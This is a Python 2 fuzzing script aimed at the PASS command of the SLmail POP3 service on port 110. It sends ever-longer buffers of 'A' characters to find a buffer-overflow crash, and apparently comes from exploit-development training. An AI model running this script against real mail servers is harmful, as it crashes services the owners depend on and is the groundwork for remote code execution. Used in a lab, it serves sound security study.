#!/usr/bin/python

import socket
import sys

if len(sys.argv[1]) == 0:
	print "[*] SLmail PASS Fuzzer Usage"
	print "[*] python fuzz-PASS.py 192.168.1.50"

# Create an array of buffers, from 1 to 5900, with increments of 200.
print ""
print "======= SLmail PASS Fuzzer ======="
buffer=["A"]
counter=100
while len(buffer) <= 30:
	buffer.append("A"*counter)
	counter=counter+200

for string in buffer:
	host = sys.argv[1]
	port = 110
	print ""
	print "Fuzzing PASS with %s bytes" % len(string)
	
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	connect=s.connect((host,port))
	s.recv(1024)
	s.send('USER test\r\n')
	s.recv(1024)
	s.send('PASS ' + string + '\r\n')
	s.send('QUIT\r\n')
	s.close()
